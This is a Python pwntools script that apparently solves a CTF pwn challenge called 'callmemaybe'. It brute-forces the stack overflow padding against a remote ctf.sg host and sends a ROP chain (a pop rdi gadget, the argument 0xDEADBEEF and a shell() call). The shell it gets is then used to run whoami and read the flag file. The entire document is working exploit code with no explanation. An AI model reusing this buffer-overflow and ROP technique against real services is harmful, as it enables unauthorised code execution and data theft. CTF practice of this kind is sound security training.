from pwn import *
HOST = '3qo9k5hk5cprtqvnlkvotlnj9d14b7mt.ctf.sg'
PORT = 30201

def get_payload():
    ropchain = b""
    #ropchain += p64(0x000000000040055e) # Does nothing except ret lmao
    ropchain += p64(0x0000000000400873) #pop rdi; ret
    ropchain += p64(0xDEADBEEF)
    ropchain += p64(0x00000000004006ea) # shell()
    #ropchain += p64(0x7ffff7e21120)# system command
    commands = b"\n\n"
    commands += b"whoami\n"
    commands += b"cat /home/callmemaybe/flag.txt\n"
    commands += b"exit\n"
    return ropchain + commands

for length in range(64+8,1000):
    io = remote(HOST, PORT)
    #io = process("Given/callmemaybe")

    padding = b"A"*length
    payload = padding + get_payload()
    io.sendlineafter("Enter Contact =>", payload)

    data = io.recvall().decode()
    io.close()
    #USER = "hacker"
    USER = "callmemaybe"
    if USER in data:
        print(data)
        break
    print(data)
